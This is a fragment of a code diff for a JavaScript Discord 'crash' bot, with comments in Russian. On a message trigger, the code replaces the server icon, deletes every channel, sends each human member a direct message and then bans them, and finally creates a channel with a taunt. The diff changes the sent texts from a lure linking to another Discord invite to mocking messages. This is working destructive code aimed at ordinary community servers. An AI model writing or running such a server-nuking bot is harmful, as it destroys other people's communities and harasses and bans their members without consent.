@@ -37,12 +37,12 @@ bot.on('message', msg => {
 		msg.guild.setIcon('https://coubsecure-s.akamaihd.net/get/b172/p/channel/cw_avatar/be07de8dd96/573da535eff8597af82fe/profile_pic_big_1521653194_neco1.png').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send(' сервер переехал сюда https://discord.gg/xJWR3dP  ').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send(' Вас крашнули  ').then(() => {
             member.ban().then(() => {
-                const name = 'говно'
+                const name = 'RIP'
                 msg.guild.createChannel(name, "text")
 					.then(channel => {
-                    channel.send('https://discord.gg/xJWR3dP сервер переехал')
+                    channel.send('Извините, но Ваш сервер очень ужасен')
                     channel.overwritePermissions(member, {
                         SEND_MESSAGES: false
                     })
